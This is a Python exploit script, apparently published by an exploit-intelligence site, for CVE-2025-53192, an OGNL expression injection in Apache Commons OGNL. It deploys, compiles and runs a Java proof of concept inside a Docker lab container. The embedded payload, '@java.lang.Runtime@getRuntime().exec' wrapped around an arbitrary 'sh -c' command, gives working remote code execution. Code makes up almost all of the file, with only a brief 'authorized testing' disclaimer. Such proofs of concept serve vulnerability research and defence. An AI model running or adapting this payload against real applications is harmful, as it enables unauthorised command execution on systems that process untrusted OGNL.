#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Apache Commons OGNL — Expression Injection to RCE (Static Method)
# CVE            : CVE-2025-53192
# Vendor         : Apache Software Foundation
# Product        : Apache Commons OGNL
# Affected       : All versions (project retired, no fix)
# Type           : CWE-146 - Expression/Command Delimiter Injection
# CVSS           : 8.8 (HIGH)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-03-01
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-53192 — Vector 1: Static Method Invocation

Exploits @java.lang.Runtime@getRuntime().exec() via the ASTStaticMethod AST
node. Deploys a Java exploit class into the vulnerable container, compiles it,
and executes it.

ATTACK CHAIN:
  1. Deploy Java PoC class into container
  2. Compile against commons-ognl.jar
  3. Evaluate malicious OGNL expression via Ognl.getValue()
  4. ASTStaticMethod → DefaultClassResolver → ClassLoader.loadClass() (NO CHECK)
  5. Runtime.getRuntime().exec() → RCE

PREREQUISITES:
  - Python 3 (stdlib only)
  - Docker container 'cve-2025-53192-vulnerable' running

REFERENCES:
  - CVE-2025-53192
  - https://github.com/advisories/GHSA-5vgh-76mj-8hcq
"""

import subprocess
import sys
import os
import tempfile
import textwrap

# ANSI color codes
RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
CYAN = "\033[1;36m"
RESET = "\033[0m"

# Default lab container name
DEFAULT_CONTAINER = "cve-2025-53192-vulnerable"

# Java classpath inside the container
CLASSPATH = "/lab:/lab/commons-ognl.jar:/lab/javassist.jar"

# The Java PoC source code — evaluates an OGNL expression demonstrating RCE
# This is the core exploit: it creates an OgnlContext with default (unrestricted)
# settings and evaluates a user-controlled expression. The expression uses
# @java.lang.Runtime@getRuntime().exec() to achieve code execution.
JAVA_POC_SOURCE = textwrap.dedent(r'''
    import org.apache.commons.ognl.Ognl;
    import org.apache.commons.ognl.OgnlContext;
    import org.apache.commons.ognl.DefaultClassResolver;
    import org.apache.commons.ognl.DefaultTypeConverter;
    import org.apache.commons.ognl.DefaultMemberAccess;
    import java.io.BufferedReader;
    import java.io.InputStreamReader;

    /**
     * CVE-2025-53192 PoC — Runtime.exec() via OGNL expression injection
     *
     * Root cause chain:
     *   1. Ognl.parseExpression(expr) → AST with ASTStaticMethod node
     *   2. ASTStaticMethod.getValueBody() → OgnlRuntime.callStaticMethod()
     *   3. OgnlRuntime.classForName() → DefaultClassResolver.classForName()
     *   4. DefaultClassResolver: ClassLoader.loadClass("java.lang.Runtime") → NO CHECK
     *   5. OgnlRuntime.invokeMethod() → Method.invoke() → Runtime.getRuntime().exec()
     *   6. DefaultMemberAccess.isAccessible() → only checks Modifier.isPublic() → PASSES
     */
    public class PoCVector1 {
        public static void main(String[] args) throws Exception {
            // Step 1: Create OGNL context with default settings
            // DefaultClassResolver: resolves ANY class (no deny list)
            // DefaultMemberAccess: only checks Java visibility (not class safety)
            DefaultMemberAccess memberAccess = new DefaultMemberAccess(false);
            OgnlContext context = new OgnlContext(
                new DefaultClassResolver(),
                new DefaultTypeConverter(),
                memberAccess
            );
            context.setRoot(new Object());

            // Step 2: The malicious OGNL expression
            // @java.lang.Runtime@getRuntime() calls Runtime.getRuntime() via static method syntax
            // .exec(new String[]{"sh","-c","CMD"}) chains .exec() on the returned Runtime object
            String command = args.length > 0 ? args[0] : "id";
            String expr = "@java.lang.Runtime@getRuntime().exec(new java.lang.String[]{\"sh\",\"-c\",\"" + command + "\"})";

            System.out.println("OGNL_EXPR: " + expr);

            // Step 3: Parse the expression into an AST
            // This creates: ASTChain → [ASTStaticMethod(@Runtime@getRuntime), ASTMethod(.exec(...))]
            Object tree = Ognl.parseExpression(expr);

            // Step 4: Evaluate the AST — this triggers the vulnerability
            // The evaluation chain:
            //   ASTStaticMethod.getValueBody() → OgnlRuntime.callStaticMethod("java.lang.Runtime", "getRuntime")
            //   → OgnlRuntime.classForName("java.lang.Runtime")
            //   → DefaultClassResolver.classForName("java.lang.Runtime")
            //   → ClassLoader.loadClass("java.lang.Runtime")  ← NO RESTRICTION
            //   → Method.invoke(null) → returns Runtime instance
            //   ASTMethod.getValueBody() → OgnlRuntime.callMethod(runtimeObj, "exec", args)
            //   → OgnlRuntime.invokeMethod() → Runtime.exec(String[])  ← COMMAND EXECUTION
            Object result = Ognl.getValue(tree, context, context.getRoot());

            // Step 5: Read the command output
            Process proc = (Process) result;
            BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            int exitCode = proc.waitFor();

            System.out.println("EXIT_CODE: " + exitCode);
            System.out.println("CMD_OUTPUT_START");
            System.out.print(output.toString());
            System.out.println("CMD_OUTPUT_END");
            System.out.println("STATUS: SUCCESS");
        }
    }
''').strip()


def run_docker_exec(container, cmd, timeout=30):
    """Execute a command inside the Docker container and return (returncode, stdout, stderr)."""
    full_cmd = ["docker", "exec", container] + cmd
    try:
        result = subprocess.run(
            full_cmd,
            capture_output=True,
            text=True,
            timeout=timeout
        )
        return result.returncode, result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "Command timed out"
    except FileNotFoundError:
        return -1, "", "docker command not found — is Docker installed?"


def copy_to_container(container, content, dest_path):
    """Write content to a file inside the container using docker exec + sh -c."""
    # Use a heredoc-style approach via stdin
    full_cmd = ["docker", "exec", "-i", container, "sh", "-c", f"cat > {dest_path}"]
    try:
        result = subprocess.run(
            full_cmd,
            input=content,
            capture_output=True,
            text=True,
            timeout=10
        )
        return result.returncode == 0
    except Exception as e:
        print(f"  {RED}[ERROR] Failed to copy file: {e}{RESET}")
        return False


def check_container_running(container):
    """Verify the target container is running."""
    try:
        result = subprocess.run(
            ["docker", "inspect", "--format", "{{.State.Running}}", container],
            capture_output=True, text=True, timeout=10
        )
        if result.returncode != 0:
            return False
        return result.stdout.strip() == "true"
    except Exception:
        return False


def exploit(container, command="id"):
    """
    Run the CVE-2025-53192 exploit against the target container.

    Demonstrates:
      - Unrestricted class loading via DefaultClassResolver
      - Unrestricted method invocation via DefaultMemberAccess
      - RCE via @java.lang.Runtime@getRuntime().exec()

    Args:
        container: Docker container name with vulnerable commons-ognl on classpath
        command: Shell command to execute via the OGNL injection
    """
    print(f"{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}  CVE-2025-53192: Apache Commons OGNL Expression Injection → RCE{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print()
    print(f"  {YELLOW}Target container:{RESET}  {container}")
    print(f"  {YELLOW}Attack vector:{RESET}     @java.lang.Runtime@getRuntime().exec()")
    print(f"  {YELLOW}Command:{RESET}           {command}")
    print(f"  {YELLOW}Vulnerability:{RESET}     Unrestricted OGNL expression evaluation")
    print(f"  {YELLOW}Root cause:{RESET}        DefaultClassResolver loads ANY class (no deny list)")
    print()

    # Step 1: Verify the container is running
    print(f"  [1/5] Checking target container is running...", end=" ")
    if not check_container_running(container):
        print(f"{RED}FAILED{RESET}")
        print(f"\n  {RED}[ERROR] Container '{container}' is not running.{RESET}")
        print(f"  Start the lab with:")
        print(f"    docker compose up -d")
        return False
    print(f"{GREEN}OK{RESET}")

    # Step 2: Copy the Java PoC into the container
    print(f"  [2/5] Deploying Java exploit to container...", end=" ")
    if not copy_to_container(container, JAVA_POC_SOURCE, "/lab/PoCVector1.java"):
        print(f"{RED}FAILED{RESET}")
        return False
    print(f"{GREEN}OK{RESET}")

    # Step 3: Compile the Java PoC inside the container
    print(f"  [3/5] Compiling exploit...", end=" ")
    rc, stdout, stderr = run_docker_exec(
        container,
        ["javac", "-cp", CLASSPATH, "/lab/PoCVector1.java"]
    )
    if rc != 0:
        print(f"{RED}FAILED{RESET}")
        print(f"\n  {RED}[ERROR] Compilation failed:{RESET}")
        print(f"  {stderr.strip()}")
        return False
    print(f"{GREEN}OK{RESET}")

    # Step 4: Execute the exploit
    print(f"  [4/5] Executing OGNL expression injection...", end=" ")
    rc, stdout, stderr = run_docker_exec(
        container,
        ["java", "-cp", CLASSPATH, "PoCVector1", command]
    )
    if rc != 0 and "STATUS: SUCCESS" not in stdout:
        print(f"{RED}FAILED{RESET}")
        print(f"\n  {RED}[ERROR] Exploit execution failed:{RESET}")
        if stderr.strip():
            print(f"  stderr: {stderr.strip()}")
        if stdout.strip():
            print(f"  stdout: {stdout.strip()}")
        return False
    print(f"{GREEN}OK{RESET}")

    # Step 5: Parse and display results
    print(f"  [5/5] Parsing results...")
    print()

    # Extract the expression used
    for line in stdout.splitlines():
        if line.startswith("OGNL_EXPR:"):
            expr = line[len("OGNL_EXPR:"):].strip()
            print(f"  {YELLOW}OGNL Expression:{RESET}")
            print(f"    {expr}")
            print()

    # Extract the command output
    cmd_output = ""
    in_output = False
    for line in stdout.splitlines():
        if line.strip() == "CMD_OUTPUT_START":
            in_output = True
            continue
        if line.strip() == "CMD_OUTPUT_END":
            in_output = False
            continue
        if in_output:
            cmd_output += line + "\n"

    success = "STATUS: SUCCESS" in stdout

    if success and cmd_output.strip():
        print(f"  {GREEN}[EXPLOIT SUCCEEDED]{RESET} Command output:")
        print(f"  {RED}┌──────────────────────────────────────────────{RESET}")
        for line in cmd_output.strip().splitlines():
            print(f"  {RED}│ {line}{RESET}")
        print(f"  {RED}└──────────────────────────────────────────────{RESET}")
        print()
        print(f"  {GREEN}✓ CVE-2025-53192 CONFIRMED — Remote Code Execution via OGNL injection{RESET}")
        print()
        print(f"  {YELLOW}Attack chain:{RESET}")
        print(f"    1. Attacker-controlled string → Ognl.parseExpression()")
        print(f"    2. ASTStaticMethod → OgnlRuntime.callStaticMethod()")
        print(f"    3. DefaultClassResolver.classForName('java.lang.Runtime') → ClassLoader.loadClass() → {RED}NO CHECK{RESET}")
        print(f"    4. OgnlRuntime.invokeMethod() → Runtime.getRuntime().exec() → {RED}RCE{RESET}")
        return True
    else:
        print(f"  {RED}[EXPLOIT FAILED]{RESET} — Unexpected output")
        print(f"  Raw stdout: {stdout}")
        return False


if __name__ == "__main__":
    container = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_CONTAINER
    command = sys.argv[2] if len(sys.argv) > 2 else "id"

    success = exploit(container, command)
    sys.exit(0 if success else 1)
